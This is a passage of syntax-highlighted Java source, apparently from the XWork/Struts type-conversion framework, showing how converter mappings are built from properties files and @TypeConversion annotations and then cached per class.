</span><span class="c1"></span>                    <span class="k">if</span> <span class="o">(</span><span class="n">key</span><span class="o">.</span><span class="na">startsWith</span><span class="o">(</span><span class="n">DefaultObjectTypeDeterminer</span><span class="o">.</span><span class="na">KEY_PROPERTY_PREFIX</span><span class="o">)</span>
                            <span class="o">||</span> <span class="n">key</span><span class="o">.</span><span class="na">startsWith</span><span class="o">(</span><span class="n">DefaultObjectTypeDeterminer</span><span class="o">.</span><span class="na">CREATE_IF_NULL_PREFIX</span><span class="o">))</span> <span class="o">{</span>
                        <span class="k">if</span> <span class="o">(</span><span class="n">LOG</span><span class="o">.</span><span class="na">isDebugEnabled</span><span class="o">())</span> <span class="o">{</span>
                            <span class="n">LOG</span><span class="o">.</span><span class="na">debug</span><span class="o">(</span><span class="s">&#34;\t&#34;</span> <span class="o">+</span> <span class="n">key</span> <span class="o">+</span> <span class="s">&#34;:&#34;</span> <span class="o">+</span> <span class="n">entry</span><span class="o">.</span><span class="na">getValue</span><span class="o">()</span> <span class="o">+</span> <span class="s">&#34;[treated as String]&#34;</span><span class="o">);</span>
                        <span class="o">}</span>
                        <span class="n">mapping</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="n">key</span><span class="o">,</span> <span class="n">entry</span><span class="o">.</span><span class="na">getValue</span><span class="o">());</span>
                    <span class="o">}</span>
                    <span class="c1">//for properties of classes
</span><span class="c1"></span>                    <span class="k">else</span> <span class="k">if</span> <span class="o">(!(</span><span class="n">key</span><span class="o">.</span><span class="na">startsWith</span><span class="o">(</span><span class="n">DefaultObjectTypeDeterminer</span><span class="o">.</span><span class="na">ELEMENT_PREFIX</span><span class="o">)</span> <span class="o">||</span>
                            <span class="n">key</span><span class="o">.</span><span class="na">startsWith</span><span class="o">(</span><span class="n">DefaultObjectTypeDeterminer</span><span class="o">.</span><span class="na">KEY_PREFIX</span><span class="o">)</span> <span class="o">||</span>
                            <span class="n">key</span><span class="o">.</span><span class="na">startsWith</span><span class="o">(</span><span class="n">DefaultObjectTypeDeterminer</span><span class="o">.</span><span class="na">DEPRECATED_ELEMENT_PREFIX</span><span class="o">))</span>
                            <span class="o">)</span> <span class="o">{</span>
                        <span class="n">TypeConverter</span> <span class="n">_typeConverter</span> <span class="o">=</span> <span class="n">createTypeConverter</span><span class="o">((</span><span class="n">String</span><span class="o">)</span> <span class="n">entry</span><span class="o">.</span><span class="na">getValue</span><span class="o">());</span>
                        <span class="k">if</span> <span class="o">(</span><span class="n">LOG</span><span class="o">.</span><span class="na">isDebugEnabled</span><span class="o">())</span> <span class="o">{</span>
                            <span class="n">LOG</span><span class="o">.</span><span class="na">debug</span><span class="o">(</span><span class="s">&#34;\t&#34;</span> <span class="o">+</span> <span class="n">key</span> <span class="o">+</span> <span class="s">&#34;:&#34;</span> <span class="o">+</span> <span class="n">entry</span><span class="o">.</span><span class="na">getValue</span><span class="o">()</span> <span class="o">+</span> <span class="s">&#34;[treated as TypeConverter &#34;</span> <span class="o">+</span> <span class="n">_typeConverter</span> <span class="o">+</span> <span class="s">&#34;]&#34;</span><span class="o">);</span>
                        <span class="o">}</span>
                        <span class="n">mapping</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="n">key</span><span class="o">,</span> <span class="n">_typeConverter</span><span class="o">);</span>
                    <span class="o">}</span>
                    <span class="c1">//for keys of Maps
</span><span class="c1"></span>                    <span class="k">else</span> <span class="k">if</span> <span class="o">(</span><span class="n">key</span><span class="o">.</span><span class="na">startsWith</span><span class="o">(</span><span class="n">DefaultObjectTypeDeterminer</span><span class="o">.</span><span class="na">KEY_PREFIX</span><span class="o">))</span> <span class="o">{</span>

                        <span class="n">Class</span> <span class="n">converterClass</span> <span class="o">=</span> <span class="n">Thread</span><span class="o">.</span><span class="na">currentThread</span><span class="o">().</span><span class="na">getContextClassLoader</span><span class="o">().</span><span class="na">loadClass</span><span class="o">((</span><span class="n">String</span><span class="o">)</span> <span class="n">entry</span><span class="o">.</span><span class="na">getValue</span><span class="o">());</span>

                        <span class="c1">//check if the converter is a type converter if it is one
</span><span class="c1"></span>                        <span class="c1">//then just put it in the map as is. Otherwise
</span><span class="c1"></span>                        <span class="c1">//put a value in for the type converter of the class
</span><span class="c1"></span>                        <span class="k">if</span> <span class="o">(</span><span class="n">converterClass</span><span class="o">.</span><span class="na">isAssignableFrom</span><span class="o">(</span><span class="n">TypeConverter</span><span class="o">.</span><span class="na">class</span><span class="o">))</span> <span class="o">{</span>
                            <span class="n">TypeConverter</span> <span class="n">_typeConverter</span> <span class="o">=</span> <span class="n">createTypeConverter</span><span class="o">((</span><span class="n">String</span><span class="o">)</span> <span class="n">entry</span><span class="o">.</span><span class="na">getValue</span><span class="o">());</span>
                            <span class="k">if</span> <span class="o">(</span><span class="n">LOG</span><span class="o">.</span><span class="na">isDebugEnabled</span><span class="o">())</span> <span class="o">{</span>
                                <span class="n">LOG</span><span class="o">.</span><span class="na">debug</span><span class="o">(</span><span class="s">&#34;\t&#34;</span> <span class="o">+</span> <span class="n">key</span> <span class="o">+</span> <span class="s">&#34;:&#34;</span> <span class="o">+</span> <span class="n">entry</span><span class="o">.</span><span class="na">getValue</span><span class="o">()</span> <span class="o">+</span> <span class="s">&#34;[treated as TypeConverter &#34;</span> <span class="o">+</span> <span class="n">_typeConverter</span> <span class="o">+</span> <span class="s">&#34;]&#34;</span><span class="o">);</span>
                            <span class="o">}</span>
                            <span class="n">mapping</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="n">key</span><span class="o">,</span> <span class="n">_typeConverter</span><span class="o">);</span>
                        <span class="o">}</span> <span class="k">else</span> <span class="o">{</span>
                            <span class="k">if</span> <span class="o">(</span><span class="n">LOG</span><span class="o">.</span><span class="na">isDebugEnabled</span><span class="o">())</span> <span class="o">{</span>
                                <span class="n">LOG</span><span class="o">.</span><span class="na">debug</span><span class="o">(</span><span class="s">&#34;\t&#34;</span> <span class="o">+</span> <span class="n">key</span> <span class="o">+</span> <span class="s">&#34;:&#34;</span> <span class="o">+</span> <span class="n">entry</span><span class="o">.</span><span class="na">getValue</span><span class="o">()</span> <span class="o">+</span> <span class="s">&#34;[treated as Class &#34;</span> <span class="o">+</span> <span class="n">converterClass</span> <span class="o">+</span> <span class="s">&#34;]&#34;</span><span class="o">);</span>
                            <span class="o">}</span>
                            <span class="n">mapping</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="n">key</span><span class="o">,</span> <span class="n">converterClass</span><span class="o">);</span>
                        <span class="o">}</span>
                    <span class="o">}</span>
                    <span class="c1">//elements(values) of maps / lists
</span><span class="c1"></span>                    <span class="k">else</span> <span class="o">{</span>
                        <span class="n">Class</span> <span class="n">_c</span> <span class="o">=</span> <span class="n">Thread</span><span class="o">.</span><span class="na">currentThread</span><span class="o">().</span><span class="na">getContextClassLoader</span><span class="o">().</span><span class="na">loadClass</span><span class="o">((</span><span class="n">String</span><span class="o">)</span> <span class="n">entry</span><span class="o">.</span><span class="na">getValue</span><span class="o">());</span>
                        <span class="k">if</span> <span class="o">(</span><span class="n">LOG</span><span class="o">.</span><span class="na">isDebugEnabled</span><span class="o">())</span> <span class="o">{</span>
                            <span class="n">LOG</span><span class="o">.</span><span class="na">debug</span><span class="o">(</span><span class="s">&#34;\t&#34;</span> <span class="o">+</span> <span class="n">key</span> <span class="o">+</span> <span class="s">&#34;:&#34;</span> <span class="o">+</span> <span class="n">entry</span><span class="o">.</span><span class="na">getValue</span><span class="o">()</span> <span class="o">+</span> <span class="s">&#34;[treated as Class &#34;</span> <span class="o">+</span> <span class="n">_c</span> <span class="o">+</span> <span class="s">&#34;]&#34;</span><span class="o">);</span>
                        <span class="o">}</span>
                        <span class="n">mapping</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="n">key</span><span class="o">,</span> <span class="n">_c</span><span class="o">);</span>
                    <span class="o">}</span>
                <span class="o">}</span>
            <span class="o">}</span>
        <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">Exception</span> <span class="n">ex</span><span class="o">)</span> <span class="o">{</span>
            <span class="n">LOG</span><span class="o">.</span><span class="na">error</span><span class="o">(</span><span class="s">&#34;Problem loading properties for &#34;</span> <span class="o">+</span> <span class="n">clazz</span><span class="o">.</span><span class="na">getName</span><span class="o">(),</span> <span class="n">ex</span><span class="o">);</span>
        <span class="o">}</span>

        <span class="c1">// Process annotations
</span><span class="c1"></span>        <span class="n">Annotation</span><span class="o">[]</span> <span class="n">annotations</span> <span class="o">=</span> <span class="n">clazz</span><span class="o">.</span><span class="na">getAnnotations</span><span class="o">();</span>

        <span class="k">for</span> <span class="o">(</span><span class="n">Annotation</span> <span class="n">annotation</span> <span class="o">:</span> <span class="n">annotations</span><span class="o">)</span> <span class="o">{</span>
            <span class="k">if</span> <span class="o">(</span><span class="n">annotation</span> <span class="k">instanceof</span> <span class="n">Conversion</span><span class="o">)</span> <span class="o">{</span>
                <span class="n">Conversion</span> <span class="n">conversion</span> <span class="o">=</span> <span class="o">(</span><span class="n">Conversion</span><span class="o">)</span> <span class="n">annotation</span><span class="o">;</span>

                <span class="k">for</span> <span class="o">(</span><span class="n">TypeConversion</span> <span class="n">tc</span> <span class="o">:</span> <span class="n">conversion</span><span class="o">.</span><span class="na">conversions</span><span class="o">())</span> <span class="o">{</span>

                    <span class="n">String</span> <span class="n">key</span> <span class="o">=</span> <span class="n">tc</span><span class="o">.</span><span class="na">key</span><span class="o">();</span>

                    <span class="k">if</span> <span class="o">(</span><span class="n">mapping</span><span class="o">.</span><span class="na">containsKey</span><span class="o">(</span><span class="n">key</span><span class="o">))</span> <span class="o">{</span>
                        <span class="k">break</span><span class="o">;</span>
                    <span class="o">}</span>
                    <span class="k">if</span> <span class="o">(</span><span class="n">LOG</span><span class="o">.</span><span class="na">isDebugEnabled</span><span class="o">())</span> <span class="o">{</span>
                        <span class="n">LOG</span><span class="o">.</span><span class="na">debug</span><span class="o">(</span><span class="n">key</span> <span class="o">+</span> <span class="s">&#34;:&#34;</span> <span class="o">+</span> <span class="n">key</span><span class="o">);</span>
                    <span class="o">}</span>

                    <span class="k">if</span> <span class="o">(</span><span class="n">key</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
                        <span class="k">try</span> <span class="o">{</span>
                            <span class="k">if</span> <span class="o">(</span><span class="n">tc</span><span class="o">.</span><span class="na">type</span><span class="o">()</span> <span class="o">==</span> <span class="n">ConversionType</span><span class="o">.</span><span class="na">APPLICATION</span><span class="o">)</span> <span class="o">{</span>
                                <span class="n">defaultMappings</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="n">key</span><span class="o">,</span> <span class="n">createTypeConverter</span><span class="o">(</span><span class="n">tc</span><span class="o">.</span><span class="na">converter</span><span class="o">()));</span>
                            <span class="o">}</span> <span class="k">else</span> <span class="o">{</span>
                                <span class="k">if</span> <span class="o">(</span><span class="n">tc</span><span class="o">.</span><span class="na">rule</span><span class="o">().</span><span class="na">toString</span><span class="o">().</span><span class="na">equals</span><span class="o">(</span><span class="n">ConversionRule</span><span class="o">.</span><span class="na">KEY_PROPERTY</span><span class="o">)</span> <span class="o">||</span> <span class="n">tc</span><span class="o">.</span><span class="na">rule</span><span class="o">().</span><span class="na">toString</span><span class="o">().</span><span class="na">equals</span><span class="o">(</span><span class="n">ConversionRule</span><span class="o">.</span><span class="na">CREATE_IF_NULL</span><span class="o">))</span> <span class="o">{</span>
                                    <span class="n">mapping</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="n">key</span><span class="o">,</span> <span class="n">tc</span><span class="o">.</span><span class="na">value</span><span class="o">());</span>
                                <span class="o">}</span>
                                <span class="c1">//for properties of classes
</span><span class="c1"></span>                                <span class="k">else</span> <span class="k">if</span> <span class="o">(!(</span><span class="n">tc</span><span class="o">.</span><span class="na">rule</span><span class="o">().</span><span class="na">toString</span><span class="o">().</span><span class="na">equals</span><span class="o">(</span><span class="n">ConversionRule</span><span class="o">.</span><span class="na">ELEMENT</span><span class="o">.</span><span class="na">toString</span><span class="o">()))</span> <span class="o">||</span>
                                        <span class="n">tc</span><span class="o">.</span><span class="na">rule</span><span class="o">().</span><span class="na">toString</span><span class="o">().</span><span class="na">equals</span><span class="o">(</span><span class="n">ConversionRule</span><span class="o">.</span><span class="na">KEY</span><span class="o">.</span><span class="na">toString</span><span class="o">())</span> <span class="o">||</span>
                                        <span class="n">tc</span><span class="o">.</span><span class="na">rule</span><span class="o">().</span><span class="na">toString</span><span class="o">().</span><span class="na">equals</span><span class="o">(</span><span class="n">ConversionRule</span><span class="o">.</span><span class="na">COLLECTION</span><span class="o">.</span><span class="na">toString</span><span class="o">())</span>
                                        <span class="o">)</span> <span class="o">{</span>
                                    <span class="n">mapping</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="n">key</span><span class="o">,</span> <span class="n">createTypeConverter</span><span class="o">(</span><span class="n">tc</span><span class="o">.</span><span class="na">converter</span><span class="o">()));</span>


                                <span class="o">}</span>
                                <span class="c1">//for keys of Maps
</span><span class="c1"></span>                                <span class="k">else</span> <span class="k">if</span> <span class="o">(</span><span class="n">tc</span><span class="o">.</span><span class="na">rule</span><span class="o">().</span><span class="na">toString</span><span class="o">().</span><span class="na">equals</span><span class="o">(</span><span class="n">ConversionRule</span><span class="o">.</span><span class="na">KEY</span><span class="o">.</span><span class="na">toString</span><span class="o">()))</span> <span class="o">{</span>
                                    <span class="n">Class</span> <span class="n">converterClass</span> <span class="o">=</span> <span class="n">Thread</span><span class="o">.</span><span class="na">currentThread</span><span class="o">().</span><span class="na">getContextClassLoader</span><span class="o">().</span><span class="na">loadClass</span><span class="o">(</span><span class="n">tc</span><span class="o">.</span><span class="na">converter</span><span class="o">());</span>
                                    <span class="k">if</span> <span class="o">(</span><span class="n">LOG</span><span class="o">.</span><span class="na">isDebugEnabled</span><span class="o">())</span> <span class="o">{</span>
                                        <span class="n">LOG</span><span class="o">.</span><span class="na">debug</span><span class="o">(</span><span class="s">&#34;Converter class: &#34;</span> <span class="o">+</span> <span class="n">converterClass</span><span class="o">);</span>
                                    <span class="o">}</span>
                                    <span class="c1">//check if the converter is a type converter if it is one
</span><span class="c1"></span>                                    <span class="c1">//then just put it in the map as is. Otherwise
</span><span class="c1"></span>                                    <span class="c1">//put a value in for the type converter of the class
</span><span class="c1"></span>                                    <span class="k">if</span> <span class="o">(</span><span class="n">converterClass</span><span class="o">.</span><span class="na">isAssignableFrom</span><span class="o">(</span><span class="n">TypeConverter</span><span class="o">.</span><span class="na">class</span><span class="o">))</span> <span class="o">{</span>
                                        <span class="n">mapping</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="n">key</span><span class="o">,</span> <span class="n">createTypeConverter</span><span class="o">(</span><span class="n">tc</span><span class="o">.</span><span class="na">converter</span><span class="o">()));</span>
                                    <span class="o">}</span> <span class="k">else</span> <span class="o">{</span>
                                        <span class="n">mapping</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="n">key</span><span class="o">,</span> <span class="n">converterClass</span><span class="o">);</span>
                                        <span class="k">if</span> <span class="o">(</span><span class="n">LOG</span><span class="o">.</span><span class="na">isDebugEnabled</span><span class="o">())</span> <span class="o">{</span>
                                            <span class="n">LOG</span><span class="o">.</span><span class="na">debug</span><span class="o">(</span><span class="s">&#34;Object placed in mapping for key &#34;</span>
                                                    <span class="o">+</span> <span class="n">key</span>
                                                    <span class="o">+</span> <span class="s">&#34; is &#34;</span>
                                                    <span class="o">+</span> <span class="n">mapping</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="n">key</span><span class="o">));</span>
                                        <span class="o">}</span>

                                    <span class="o">}</span>

                                <span class="o">}</span>
                                <span class="c1">//elements(values) of maps / lists
</span><span class="c1"></span>                                <span class="k">else</span> <span class="o">{</span>
                                    <span class="n">mapping</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="n">key</span><span class="o">,</span> <span class="n">Thread</span><span class="o">.</span><span class="na">currentThread</span><span class="o">().</span><span class="na">getContextClassLoader</span><span class="o">().</span><span class="na">loadClass</span><span class="o">(</span><span class="n">tc</span><span class="o">.</span><span class="na">converter</span><span class="o">()));</span>
                                <span class="o">}</span>
                            <span class="o">}</span>
                        <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">Exception</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
                        <span class="o">}</span>
                    <span class="o">}</span>
                <span class="o">}</span>
            <span class="o">}</span>
        <span class="o">}</span>

        <span class="n">Method</span><span class="o">[]</span> <span class="n">methods</span> <span class="o">=</span> <span class="n">clazz</span><span class="o">.</span><span class="na">getMethods</span><span class="o">();</span>

        <span class="k">for</span> <span class="o">(</span><span class="n">Method</span> <span class="n">method</span> <span class="o">:</span> <span class="n">methods</span><span class="o">)</span> <span class="o">{</span>

            <span class="n">annotations</span> <span class="o">=</span> <span class="n">method</span><span class="o">.</span><span class="na">getAnnotations</span><span class="o">();</span>

            <span class="k">for</span> <span class="o">(</span><span class="n">Annotation</span> <span class="n">annotation</span> <span class="o">:</span> <span class="n">annotations</span><span class="o">)</span> <span class="o">{</span>
                <span class="k">if</span> <span class="o">(</span><span class="n">annotation</span> <span class="k">instanceof</span> <span class="n">TypeConversion</span><span class="o">)</span> <span class="o">{</span>
                    <span class="n">TypeConversion</span> <span class="n">tc</span> <span class="o">=</span> <span class="o">(</span><span class="n">TypeConversion</span><span class="o">)</span> <span class="n">annotation</span><span class="o">;</span>

                    <span class="n">String</span> <span class="n">key</span> <span class="o">=</span> <span class="n">tc</span><span class="o">.</span><span class="na">key</span><span class="o">();</span>
                    <span class="k">if</span> <span class="o">(</span><span class="n">mapping</span><span class="o">.</span><span class="na">containsKey</span><span class="o">(</span><span class="n">key</span><span class="o">))</span> <span class="o">{</span>
                        <span class="k">break</span><span class="o">;</span>
                    <span class="o">}</span>
                    <span class="c1">// Default to the property name
</span><span class="c1"></span>                    <span class="k">if</span> <span class="o">(</span><span class="n">key</span> <span class="o">!=</span> <span class="kc">null</span> <span class="o">&amp;&amp;</span> <span class="n">key</span><span class="o">.</span><span class="na">length</span><span class="o">()</span> <span class="o">==</span> <span class="n">0</span><span class="o">)</span> <span class="o">{</span>
                        <span class="n">key</span> <span class="o">=</span> <span class="n">AnnotationUtils</span><span class="o">.</span><span class="na">resolvePropertyName</span><span class="o">(</span><span class="n">method</span><span class="o">);</span>
                        <span class="n">LOG</span><span class="o">.</span><span class="na">debug</span><span class="o">(</span><span class="s">&#34;key from method name... &#34;</span> <span class="o">+</span> <span class="n">key</span> <span class="o">+</span> <span class="s">&#34; - &#34;</span> <span class="o">+</span> <span class="n">method</span><span class="o">.</span><span class="na">getName</span><span class="o">());</span>
                    <span class="o">}</span>


                    <span class="k">if</span> <span class="o">(</span><span class="n">LOG</span><span class="o">.</span><span class="na">isDebugEnabled</span><span class="o">())</span> <span class="o">{</span>
                        <span class="n">LOG</span><span class="o">.</span><span class="na">debug</span><span class="o">(</span><span class="n">key</span> <span class="o">+</span> <span class="s">&#34;:&#34;</span> <span class="o">+</span> <span class="n">key</span><span class="o">);</span>
                    <span class="o">}</span>

                    <span class="k">if</span> <span class="o">(</span><span class="n">key</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
                        <span class="k">try</span> <span class="o">{</span>
                            <span class="k">if</span> <span class="o">(</span><span class="n">tc</span><span class="o">.</span><span class="na">type</span><span class="o">()</span> <span class="o">==</span> <span class="n">ConversionType</span><span class="o">.</span><span class="na">APPLICATION</span><span class="o">)</span> <span class="o">{</span>
                                <span class="n">defaultMappings</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="n">key</span><span class="o">,</span> <span class="n">createTypeConverter</span><span class="o">(</span><span class="n">tc</span><span class="o">.</span><span class="na">converter</span><span class="o">()));</span>
                            <span class="o">}</span> <span class="k">else</span> <span class="o">{</span>
                                <span class="k">if</span> <span class="o">(</span><span class="n">tc</span><span class="o">.</span><span class="na">rule</span><span class="o">().</span><span class="na">toString</span><span class="o">().</span><span class="na">equals</span><span class="o">(</span><span class="n">ConversionRule</span><span class="o">.</span><span class="na">KEY_PROPERTY</span><span class="o">))</span> <span class="o">{</span>
                                    <span class="n">mapping</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="n">key</span><span class="o">,</span> <span class="n">tc</span><span class="o">.</span><span class="na">value</span><span class="o">());</span>
                                <span class="o">}</span>
                                <span class="c1">//for properties of classes
</span><span class="c1"></span>                                <span class="k">else</span> <span class="k">if</span> <span class="o">(!(</span><span class="n">tc</span><span class="o">.</span><span class="na">rule</span><span class="o">().</span><span class="na">toString</span><span class="o">().</span><span class="na">equals</span><span class="o">(</span><span class="n">ConversionRule</span><span class="o">.</span><span class="na">ELEMENT</span><span class="o">.</span><span class="na">toString</span><span class="o">()))</span> <span class="o">||</span>
                                        <span class="n">tc</span><span class="o">.</span><span class="na">rule</span><span class="o">().</span><span class="na">toString</span><span class="o">().</span><span class="na">equals</span><span class="o">(</span><span class="n">ConversionRule</span><span class="o">.</span><span class="na">KEY</span><span class="o">.</span><span class="na">toString</span><span class="o">())</span> <span class="o">||</span>
                                        <span class="n">tc</span><span class="o">.</span><span class="na">rule</span><span class="o">().</span><span class="na">toString</span><span class="o">().</span><span class="na">equals</span><span class="o">(</span><span class="n">ConversionRule</span><span class="o">.</span><span class="na">COLLECTION</span><span class="o">.</span><span class="na">toString</span><span class="o">())</span>
                                        <span class="o">)</span> <span class="o">{</span>
                                    <span class="n">mapping</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="n">key</span><span class="o">,</span> <span class="n">createTypeConverter</span><span class="o">(</span><span class="n">tc</span><span class="o">.</span><span class="na">converter</span><span class="o">()));</span>
                                <span class="o">}</span>
                                <span class="c1">//for keys of Maps
</span><span class="c1"></span>                                <span class="k">else</span> <span class="k">if</span> <span class="o">(</span><span class="n">tc</span><span class="o">.</span><span class="na">rule</span><span class="o">().</span><span class="na">toString</span><span class="o">().</span><span class="na">equals</span><span class="o">(</span><span class="n">ConversionRule</span><span class="o">.</span><span class="na">KEY</span><span class="o">.</span><span class="na">toString</span><span class="o">()))</span> <span class="o">{</span>
                                    <span class="n">Class</span> <span class="n">converterClass</span> <span class="o">=</span> <span class="n">Thread</span><span class="o">.</span><span class="na">currentThread</span><span class="o">().</span><span class="na">getContextClassLoader</span><span class="o">().</span><span class="na">loadClass</span><span class="o">(</span><span class="n">tc</span><span class="o">.</span><span class="na">converter</span><span class="o">());</span>
                                    <span class="k">if</span> <span class="o">(</span><span class="n">LOG</span><span class="o">.</span><span class="na">isDebugEnabled</span><span class="o">())</span> <span class="o">{</span>
                                        <span class="n">LOG</span><span class="o">.</span><span class="na">debug</span><span class="o">(</span><span class="s">&#34;Converter class: &#34;</span> <span class="o">+</span> <span class="n">converterClass</span><span class="o">);</span>
                                    <span class="o">}</span>
                                    <span class="c1">//check if the converter is a type converter if it is one
</span><span class="c1"></span>                                    <span class="c1">//then just put it in the map as is. Otherwise
</span><span class="c1"></span>                                    <span class="c1">//put a value in for the type converter of the class
</span><span class="c1"></span>                                    <span class="k">if</span> <span class="o">(</span><span class="n">converterClass</span><span class="o">.</span><span class="na">isAssignableFrom</span><span class="o">(</span><span class="n">TypeConverter</span><span class="o">.</span><span class="na">class</span><span class="o">))</span> <span class="o">{</span>
                                        <span class="n">mapping</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="n">key</span><span class="o">,</span> <span class="n">createTypeConverter</span><span class="o">(</span><span class="n">tc</span><span class="o">.</span><span class="na">converter</span><span class="o">()));</span>
                                    <span class="o">}</span> <span class="k">else</span> <span class="o">{</span>
                                        <span class="n">mapping</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="n">key</span><span class="o">,</span> <span class="n">converterClass</span><span class="o">);</span>
                                        <span class="k">if</span> <span class="o">(</span><span class="n">LOG</span><span class="o">.</span><span class="na">isDebugEnabled</span><span class="o">())</span> <span class="o">{</span>
                                            <span class="n">LOG</span><span class="o">.</span><span class="na">debug</span><span class="o">(</span><span class="s">&#34;Object placed in mapping for key &#34;</span>
                                                    <span class="o">+</span> <span class="n">key</span>
                                                    <span class="o">+</span> <span class="s">&#34; is &#34;</span>
                                                    <span class="o">+</span> <span class="n">mapping</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="n">key</span><span class="o">));</span>
                                        <span class="o">}</span>

                                    <span class="o">}</span>

                                <span class="o">}</span>
                                <span class="c1">//elements(values) of maps / lists
</span><span class="c1"></span>                                <span class="k">else</span> <span class="o">{</span>
                                    <span class="n">mapping</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="n">key</span><span class="o">,</span> <span class="n">Thread</span><span class="o">.</span><span class="na">currentThread</span><span class="o">().</span><span class="na">getContextClassLoader</span><span class="o">().</span><span class="na">loadClass</span><span class="o">(</span><span class="n">tc</span><span class="o">.</span><span class="na">converter</span><span class="o">()));</span>
                                <span class="o">}</span>
                            <span class="o">}</span>
                        <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">Exception</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
                        <span class="o">}</span>
                    <span class="o">}</span>
                <span class="o">}</span>
            <span class="o">}</span>
        <span class="o">}</span>
    <span class="o">}</span>

    <span class="cm">/**
</span><span class="cm">     * Looks for converter mappings for the specified class, traversing up its class hierarchy and interfaces and adding
</span><span class="cm">     * any additional mappings it may find.  Mappings lower in the hierarchy have priority over those higher in the
</span><span class="cm">     * hierarcy.
</span><span class="cm">     *
</span><span class="cm">     * @param clazz the class to look for converter mappings for
</span><span class="cm">     * @return the converter mappings
</span><span class="cm">     */</span>
    <span class="kd">protected</span> <span class="n">Map</span><span class="o">&lt;</span><span class="n">String</span><span class="o">,</span> <span class="n">Object</span><span class="o">&gt;</span> <span class="nf">buildConverterMapping</span><span class="o">(</span><span class="n">Class</span> <span class="n">clazz</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">Exception</span> <span class="o">{</span>
        <span class="n">Map</span><span class="o">&lt;</span><span class="n">String</span><span class="o">,</span> <span class="n">Object</span><span class="o">&gt;</span> <span class="n">mapping</span> <span class="o">=</span> <span class="k">new</span> <span class="n">HashMap</span><span class="o">&lt;</span><span class="n">String</span><span class="o">,</span> <span class="n">Object</span><span class="o">&gt;();</span>

        <span class="c1">// check for conversion mapping associated with super classes and any implemented interfaces
</span><span class="c1"></span>        <span class="n">Class</span> <span class="n">curClazz</span> <span class="o">=</span> <span class="n">clazz</span><span class="o">;</span>

        <span class="k">while</span> <span class="o">(!</span><span class="n">curClazz</span><span class="o">.</span><span class="na">equals</span><span class="o">(</span><span class="n">Object</span><span class="o">.</span><span class="na">class</span><span class="o">))</span> <span class="o">{</span>
            <span class="c1">// add current class&#39; mappings
</span><span class="c1"></span>            <span class="n">addConverterMapping</span><span class="o">(</span><span class="n">mapping</span><span class="o">,</span> <span class="n">curClazz</span><span class="o">);</span>

            <span class="c1">// check interfaces&#39; mappings
</span><span class="c1"></span>            <span class="n">Class</span><span class="o">[]</span> <span class="n">interfaces</span> <span class="o">=</span> <span class="n">curClazz</span><span class="o">.</span><span class="na">getInterfaces</span><span class="o">();</span>

            <span class="k">for</span> <span class="o">(</span><span class="n">Class</span> <span class="n">anInterface</span> <span class="o">:</span> <span class="n">interfaces</span><span class="o">)</span> <span class="o">{</span>
                <span class="n">addConverterMapping</span><span class="o">(</span><span class="n">mapping</span><span class="o">,</span> <span class="n">anInterface</span><span class="o">);</span>
            <span class="o">}</span>

            <span class="n">curClazz</span> <span class="o">=</span> <span class="n">curClazz</span><span class="o">.</span><span class="na">getSuperclass</span><span class="o">();</span>
        <span class="o">}</span>

        <span class="k">if</span> <span class="o">(</span><span class="n">mapping</span><span class="o">.</span><span class="na">size</span><span class="o">()</span> <span class="o">&gt;</span> <span class="n">0</span><span class="o">)</span> <span class="o">{</span>
            <span class="n">mappings</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="n">clazz</span><span class="o">,</span> <span class="n">mapping</span><span class="o">);</span>
        <span class="o">}</span> <span class="k">else</span> <span class="o">{</span>
            <span class="n">noMapping</span><span class="o">.</span><span class="na">add</span><span class="o">(</span><span class="n">clazz</span><span class="o">);</span>
        <span class="o">}</span>

        <span class="k">return</span> <span class="n">mapping</span><span class="o">;</span>
    <span class="o">}</span>

    <span class="kd">private</span> <span class="n">Map</span><span class="o">&lt;</span><span class="n">String</span><span class="o">,</span> <span class="n">Object</span><span class="o">&gt;</span> <span class="nf">conditionalReload</span><span class="o">(</span><span class="n">Class</span> <span class="n">clazz</span><span class="o">,</span> <span class="n">Map</span><span class="o">&lt;</span><span class="n">String</span><span class="o">,</span> <span class="n">Object</span><span class="o">&gt;</span> <span class="n">oldValues</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">Exception</span> <span class="o">{</span>
        <span class="n">Map</span><span class="o">&lt;</span><span class="n">String</span><span class="o">,</span> <span class="n">Object</span><span class="o">&gt;</span> <span class="n">mapping</span> <span class="o">=</span> <span class="n">oldValues</span><span class="o">;</span>

        <span class="k">if</span> <span class="o">(</span><span class="n">FileManager</span><span class="o">.</span><span class="na">isReloadingConfigs</span><span class="o">())</span> <span class="o">{</span>
            <span class="k">if</span> <span class="o">(</span><span class="n">FileManager</span><span class="o">.</span><span class="na">fileNeedsReloading</span><span class="o">(</span><span class="n">buildConverterFilename</span><span class="o">(</span><span class="n">clazz</span><span class="o">),</span> <span class="n">clazz</span><span class="o">))</span> <span class="o">{</span>
                <span class="n">mapping</span> <span class="o">=</span> <span class="n">buildConverterMapping</span><span class="o">(</span><span class="n">clazz</span><span class="o">);</span>
            <span class="o">}</span>
